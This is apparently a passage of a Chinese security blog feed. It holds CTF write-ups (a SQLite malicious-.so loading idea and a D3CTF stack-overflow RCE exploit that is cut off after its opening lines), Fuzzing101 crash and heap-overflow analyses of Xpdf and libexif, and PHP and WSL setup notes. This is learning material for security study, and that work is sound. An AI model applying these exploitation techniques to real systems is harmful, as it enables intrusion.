class="code"><pre><span class="line">- BOOT-INF<span class="comment">// BOOT-INF是Spring Boot项目中JAR文件的特殊目录结构，用于支持Spring Boot的自动化配置和启动功能</span></span><br><span class="line">    - classes<span class="comment">// 项目中java文件编译后的class文件和资源文件的目录</span></span><br><span class="line">  - lib<span class="comment">// 依赖的jar包</span></span><br><span class="line">    </span><br><span class="line">- META-INF      <span class="comment">// META-INF是标准的JAR文件目录，用于存放元数据和配置文件</span></span><br><span class="line">- maven.com.example.jdbcTest</span><br><span class="line">    - porm.properties    <span class="comment">// </span></span><br><span class="line">    - porm.xml    <span class="comment">// </span></span><br><span class="line">    - MANIFEST.MF <span class="comment">//JAR文件的清单文件，包含JAR文件的元数据，如版本信息、主类等</span></span><br></pre></td></tr></table></figure><ul><li>Java Bean</li></ul><blockquote><p>JavaBean是一类按照特定约定实现的Java类，一般有如下特点：</p><ul><li>无参构造函数</li><li>私有属性</li><li>公有的getter和setter方法</li><li>可序列化</li></ul></blockquote><ul><li>做题习惯</li></ul><blockquote><ul><li><p>lib</p></li><li><p>porm.xml</p></li></ul></blockquote><h3 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h3><p>参考进行复现：<a href="https://blog.csdn.net/uuzeray/article/details/139052904">https://blog.csdn.net/uuzeray/article/details/139052904</a></p><p>表单提交后的路由到这里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/connect&quot;&#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> ResultBean <span class="title function_">connect</span><span class="params">(<span class="meta">@RequestBody</span> JdbcBean jdbcBean)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResultBean</span>(<span class="number">1</span>, String.join(<span class="string">&quot;,&quot;</span>, <span class="built_in">this</span>.datasourceServiceImpl.testDatasourceConnectionAble(jdbcBean)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResultBean</span>(<span class="number">0</span>, <span class="string">&quot;连接失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进查看testDatasourceConnectionAble函数，这里进行Jdbc的类型匹配</p><p>给了三个JDBC的服务和sqlite服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] testDatasourceConnectionAble(JdbcBean jdbcBean) <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">    <span class="type">DatasourceLoadConfig</span> <span class="variable">var10000</span> <span class="operator">=</span> <span class="built_in">this</span>.datasourceLoadConfig;</span><br><span class="line">    Map&lt;String, String&gt; config = DatasourceLoadConfig.getConfig();</span><br><span class="line">    <span class="keyword">switch</span> (jdbcBean.getType()) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            Class.forName((String)config.get(<span class="string">&quot;JDBC-MYSQL&quot;</span>));</span><br><span class="line">            <span class="type">MysqlDatasourceConnector</span> <span class="variable">mysqlDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MysqlDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));</span><br><span class="line">            <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> mysqlDatasourceConnector.getTableContent(jdbcBean.getTableName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> mysqlDatasourceConnector.getTables();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            Class.forName((String)config.get(<span class="string">&quot;JDBC-POSTGRES&quot;</span>));</span><br><span class="line">            <span class="type">PostgresDatasourceConnector</span> <span class="variable">postgresDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PostgresDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));</span><br><span class="line">            <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> postgresDatasourceConnector.getTableContent(jdbcBean.getTableName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> postgresDatasourceConnector.getTables();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="type">SqliteDatasourceConnector</span> <span class="variable">sqliteDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqliteDatasourceConnector</span>(jdbcBean.getUrl());</span><br><span class="line">            <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> sqliteDatasourceConnector.getTableContent(jdbcBean.getTableName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sqliteDatasourceConnector.getTables();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            Class.forName((String)config.get(<span class="string">&quot;JDBC-SQLITE&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上能利用的是sqlite服务</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240620205837325.png" alt="image-20240620205837325"></p><p>大致原理就是写入恶意so文件，然后利用sqlite加载恶意so文件</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Debug】phpweb+phpstorm调试记录</title>
      <link href="/2024/05/10/DevOps/php-web-debug/"/>
      <url>/2024/05/10/DevOps/php-web-debug/</url>
      
        <content type="html"><![CDATA[<p>之前配置过了好多次，但是每次都忘了怎么配置，所以打算记录一下</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>OS：Windows</p><p>IDE：PHPStorm</p><h1 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h1><p>首先开启php.ini中的Xdebug项</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101055352.png" alt="image-20240510092712260"></p><p>使用phpinfo中的信息，下载对应的xdebug.dll文件，然后移动到对应的php目录下的ext文件夹中</p><p>修改php.ini</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101055745.png" alt="image-20240510093657750"></p><h1 id="配置PHPSTORM"><a href="#配置PHPSTORM" class="headerlink" title="配置PHPSTORM"></a>配置PHPSTORM</h1><p>首先配置php环境</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101055819.png" alt="image-20240510094043769"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101055653.png" alt="image-20240510094021676"></p><p>设置调试端口</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101055212.png" alt="image-20240510094454858"></p><p>验证</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101055634.png" alt="image-20240510094515977"></p><h1 id="调试时的超时问题"><a href="#调试时的超时问题" class="headerlink" title="调试时的超时问题"></a>调试时的超时问题</h1><p>修改apache的http.conf和php.ini</p><p>启用httpd-default和httpd-fcgid两个conf文件</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101054339.png" alt="image-20240510104612272"></p><p>管理员权限下运行记事本修改default</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101054713.png" alt="image-20240510104724368"></p><p>创建fcgid文件，写入</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ProcessLifeTime 3600</span><br><span class="line">FcgidIOTimeout 3600</span><br><span class="line">FcgidConnectTimeout 3600</span><br><span class="line">FcgidOutputBufferSize 128</span><br><span class="line">FcgidMaxRequestsPerProcess 1000</span><br><span class="line">FcgidMinProcessesPerClass 0 </span><br><span class="line">FcgidMaxProcesses 16 </span><br><span class="line">FcgidMaxRequestLen 268435456   </span><br><span class="line">FcgidInitialEnv PHP_FCGI_MAX_REQUESTS 1000</span><br><span class="line">IPCConnectTimeout 3600</span><br><span class="line">IPCCommTimeout 3600</span><br><span class="line">FcgidIdleTimeout 3600</span><br><span class="line">FcgidBusyTimeout 60000</span><br><span class="line">FcgidBusyScanInterval 120</span><br><span class="line">FcgidInitialEnv PHPRC &quot;D:\phpstudy_pro_\phpstudy_pro\Extensions\php\php7.2.9nts&quot;</span><br><span class="line">AddHandler fcgid-script .php</span><br></pre></td></tr></table></figure><p>最后修改php.ini，加入</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">max_execution_time</span> = <span class="number">3600</span></span><br></pre></td></tr></table></figure><h1 id="调试成功✌"><a href="#调试成功✌" class="headerlink" title="调试成功✌"></a>调试成功✌</h1><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405101054608.png" alt="image-20240510105443290"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzing101-复现记录</title>
      <link href="/2024/05/03/Fuzzing-101/"/>
      <url>/2024/05/03/Fuzzing-101/</url>
      
        <content type="html"><![CDATA[<blockquote><p>学长搞Fuzz毕设，顺道跟着学了点</p><p>寒假时，主要跟着Github上的<a href="https://github.com/antonio-morales/Fuzzing101">Fuzzing-101</a>的项目学习复现</p></blockquote><h1 id="Exercise1-Xpdf"><a href="#Exercise1-Xpdf" class="headerlink" title="Exercise1 - Xpdf"></a>Exercise1 - Xpdf</h1><blockquote><p>目标：fuzz Xpdf PDF查看器，在Xpdf 3.02中查找 CVE-2019-13208 崩溃</p></blockquote><h2 id="使用afl-clang-fast编译器构建Xpdf（插桩）"><a href="#使用afl-clang-fast编译器构建Xpdf（插桩）" class="headerlink" title="使用afl-clang-fast编译器构建Xpdf（插桩）"></a>使用afl-clang-fast编译器构建Xpdf（插桩）</h2><p>导入llvm环境变量，指明llvm的版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br></pre></td></tr></table></figure><p>指定编译器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="运行afl-fuzz"><a href="#运行afl-fuzz" class="headerlink" title="运行afl-fuzz"></a>运行afl-fuzz</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output</span><br></pre></td></tr></table></figure><p><code>-i</code>：输入案例的目录</p><p><code>-o</code>：存储AFL存储突变文件的目录</p><p><code>-s</code>：指定静态伪随机数种子</p><p><code>--</code>：指向<code>afl-fuzz</code>的输入案例的具体样本</p><p><code>@@</code>：文件占位符，为<code>-i</code>目录中具体文件</p><h2 id="处理报错"><a href="#处理报错" class="headerlink" title="处理报错"></a>处理报错</h2><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401141754952.png" alt="image-20240114175354734"></p><p><code>export</code>环境变量<code>AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES=1</code></p><p>然后开始运行<code>fuzz</code></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401192251049.png" alt="image-20240114175755242"></p><p>此处我们主要看<code>overall results</code>中的<code>crashes</code>提示</p><h2 id="复现crash"><a href="#复现crash" class="headerlink" title="复现crash"></a>复现crash</h2><p>重新编译Xpdf，以包含调试信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_xpdf/install</span><br><span class="line">cd $HOME/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br><span class="line">CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><pre><code>然后使用gdb调试</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt; $HOME/fuzzing_xpdf/output</span><br></pre></td></tr></table></figure><p>运行后查看栈帧，发现了循环调用</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240515211506469.png" alt="image-20240515211506469"></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>不断跟进直至最后的循环，可以发现最后是在一个在<code>getObj</code>函数中的<code>makeStream</code>处产生循环</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240515231008350.png" alt="image-20240515231008350"></p><p>单步进入</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240515231815573.png" alt="image-20240515231815573"></p><p>makeStream中调用了dictLookup函数，dictLookup函数封装了lookup函数</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240515231945134.png" alt="image-20240515231945134"></p><p>然后lookup函数中又封装了find函数赖来寻找<code>Key=Length</code></p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240515232302197.png" alt="image-20240515232302197"></p><p>取如下地址返回到<code>lookup</code>函数</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240515232613438.png" alt="image-20240515232613438"></p><p><code>e-&gt;val.fetch(xref, obj)</code>为<code>Object.fecth</code>调用，但本质上是封装。调试发现<code>find(key)</code>不为空，然后再次调用<code>xref.fetch</code>，打印可以发现<code>e</code>中的<code>val</code>为<code>XRef</code>对象</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240515232748740.png" alt="image-20240515232748740"></p><p>跟进验证上述说法，当<code>type == objRef &amp;&amp; xref</code>不为空时，调用<code>xref-&gt;fetch</code>函数</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240515232901939.png" alt="image-20240515232901939"></p><p>跟进<code>fetch</code>，调用了<code>getObj</code>，完成循环调用</p><p><img src="C:\Users\14537\AppData\Roaming\Typora\typora-user-images\image-20240515233228467.png" alt="image-20240515233228467"></p><h3 id="分析原因"><a href="#分析原因" class="headerlink" title="分析原因"></a>分析原因</h3><p>产生这种洞的原因是通过fuzz产生的二进制数据满足了某条死循环的执行路径，从而产生拒绝服务</p><h1 id="Exercise-2-libexif-0-16-14-Fuzz"><a href="#Exercise-2-libexif-0-16-14-Fuzz" class="headerlink" title="Exercise 2 - libexif 0.16.14 Fuzz"></a>Exercise 2 - libexif 0.16.14 Fuzz</h1><h2 id="libexif和exif是什么？"><a href="#libexif和exif是什么？" class="headerlink" title="libexif和exif是什么？"></a>libexif和exif是什么？</h2><p>libexif是一个可移植C语言编写的库，作用是从图像文件读取和写入EXIF元信息</p><p>exif是一种图片格式</p><p>我们需要使用libexif解析exif</p><h2 id="构建libexif"><a href="#构建libexif" class="headerlink" title="构建libexif"></a>构建libexif</h2><p>从GitHub上wget对应的demo版本后</p><p>安装工具链</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install autopoint libtool gettext libpopt-dev</span><br></pre></td></tr></table></figure><p>然后使用autoreconf生成Makefile，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">autoreconf -fvi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f 强制生成文件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-v 显示详细的输出信息</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-i 自动运行aclocal和autoheader</span></span><br></pre></td></tr></table></figure><p>静态编译，并指定生成路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --enable-shared=no --prefix=&quot;/home/fuzz/fuzzing_libexif/install&quot;</span><br></pre></td></tr></table></figure><p>然后编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="构建exif并调用libexif解析"><a href="#构建exif并调用libexif解析" class="headerlink" title="构建exif并调用libexif解析"></a>构建exif并调用libexif解析</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autoreconf -fvi</span><br></pre></td></tr></table></figure><p>然后静态编译，并指明<code>pc</code>文件路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --enable-shared=no --prefix=&quot;/home/fuzz/fuzzing_libexif/install&quot; PGP_CONFIG_PATH=/home/fuzz/fuzzing_libexif/install/lib/pkgconfig</span><br></pre></td></tr></table></figure><p>然后编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>去网上找了个exif图片格式的图片仓库：<a href="https://github.com/ianare/exif-samples">https://github.com/ianare/exif-samples</a></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401192251733.png" alt="image-20240119224157553"></p><h2 id="使用-QEMU-模式执行模糊测试"><a href="#使用-QEMU-模式执行模糊测试" class="headerlink" title="使用 QEMU 模式执行模糊测试"></a>使用 QEMU 模式执行模糊测试</h2><p>​添加软件源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/apt/sources.list</span><br><span class="line">deb http://th.archive.ubuntu.com/ubuntu jammy main</span><br></pre></td></tr></table></figure><p>​然后更新，安装最新版本的libc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install libc6</span><br></pre></td></tr></table></figure><p>​进行模糊测试</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301143313.png" alt="image-20240521161226514"></p><h2 id="分析-crash"><a href="#分析-crash" class="headerlink" title="分析 crash"></a>分析 crash</h2><h3 id="分析堆溢出"><a href="#分析堆溢出" class="headerlink" title="分析堆溢出"></a>分析堆溢出</h3><p>​分析其中一个crash</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301143727.png" alt="image-20240521170800506"></p><p>​直接运行后查看栈帧，发现在<code>malloc_printer</code>中报了<code>realloc(): invalid next size</code>的崩溃，然后在<code>exif_entry_fix</code>处下断点</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301143791.png" alt="image-20240521192641398"></p><p>​发现<code>continue</code>12次发生崩溃，通过IDA反汇编查看函数<code>exif_entry_fix</code>处的函数情况</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301143256.png" alt="image-20240521214608871"></p><p>​此处调试循环，发现崩溃样例中的循环次数为<code>0x66</code>次</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301143269.png" alt="image-20240521214736335"></p><p>​同时由于<code>exif_set_short</code>函数中，$v_{13}$为2字节，所以$&amp;v_{12}$数组每次都以2字节偏移，而$v_9$只有1字节数据</p><p>​在经过<code>e-&gt;components</code>次循环后（调试中为102次），写入<code>2*102</code>了字节</p><p>​现在查看分配的堆块大小，堆块大小在分配的堆内存前<code>0x10</code>字节，<strong>大于</strong>分配的堆块大小<code>0x70</code>个字节（<code>0x71</code>中的<code>0x1</code>为标志位，置为<code>1</code>表示前一个堆块正在使用），在<code>realloc</code>中的内存写中会存在溢出，造成覆写后续堆块的<code>chunk_size</code> 导致<code>realloc</code>抛出异常。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301143677.png" alt="image-20240521224654480"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301142891.png" alt="image-20240521221425576"></p><p>​那么在循环结束时，调用这个函数，这个函数封装了<code>realloc</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;data = (<span class="type">unsigned</span> __int8 *)exif_entry_realloc(e, e-&gt;data, e-&gt;size);</span><br></pre></td></tr></table></figure><h3 id="崩溃原因"><a href="#崩溃原因" class="headerlink" title="崩溃原因"></a>崩溃原因</h3><p>​查看glibc中realloc函数源码，可以发现由于堆溢出覆盖了堆上的数据（覆盖后几乎都是0，比较下列两张图）,<code>chunksize_nomask (next) &lt;= CHUNK_HDR_SZ</code>满足条件，从而抛出异常</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">next = <span class="built_in">chunk_at_offset</span> (oldp, oldsize);</span><br><span class="line">INTERNAL_SIZE_T nextsize = <span class="built_in">chunksize</span> (next);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (<span class="built_in">chunksize_nomask</span> (next) &lt;= CHUNK_HDR_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  <span class="built_in">malloc_printerr</span> (<span class="string">&quot;realloc(): invalid next size&quot;</span>)</span><br></pre></td></tr></table></figure><p>​</p><p>（循环之前）</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301142734.png" alt="c5d49bb354a4c9d484ecc93d55453c27"></p><p>（经过循环之后）</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301142913.png" alt="de7bdc33ba55e7f1321f1f4b6b6c580d"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSL Ubuntu与Windows的环境变量管理</title>
      <link href="/2024/05/02/DevOps/wsl-path-manage/"/>
      <url>/2024/05/02/DevOps/wsl-path-manage/</url>
      
        <content type="html"><![CDATA[<h1 id="WSL与Windows的环境变量管理"><a href="#WSL与Windows的环境变量管理" class="headerlink" title="WSL与Windows的环境变量管理"></a>WSL与Windows的环境变量管理</h1><p>在WSL2中默认可以获取宿主机中的环境变量，从而会导致混淆等错误</p><p>隔离方法如下</p><p>创建<code>/etc/wsl.conf</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">touch</span> /etc/wsl.conf</span><br></pre></td></tr></table></figure><p>然后修改内容为</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[interop]</span><br><span class="line">appendWindowsPath = false</span><br></pre></td></tr></table></figure><p>重启<code>wsl</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405021240386.png" alt="image-20240502124023025"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024-D3CTF-WP and Review</title>
      <link href="/2024/05/02/WriteUp/2024-D3CTF-Review/"/>
      <url>/2024/05/02/WriteUp/2024-D3CTF-Review/</url>
      
        <content type="html"><![CDATA[<h1 id="2024-D-3CTF-Web-WP和复现"><a href="#2024-D-3CTF-Web-WP和复现" class="headerlink" title="2024-D^3CTF-Web-WP和复现"></a>2024-D^3CTF-Web-WP和复现</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack-Overflow"></a>Stack-Overflow</h3><p>大致流程就是通过栈溢出将PIE write到stdout从而泄露PIE，然后通过溢出执行read覆盖cmd，从而实现RCE</p><p>这题附件和远端环境还不一样，真搞人。。。</p><p>EXP如下，最后直接访问index.html就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://106.14.121.29:32149&quot;</span></span><br><span class="line"><span class="comment">#url = &quot;http://127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># read the pie</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readThePIE</span>():</span><br><span class="line">    s = requests.session()</span><br><span class="line"></span><br><span class="line">    exploit = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span 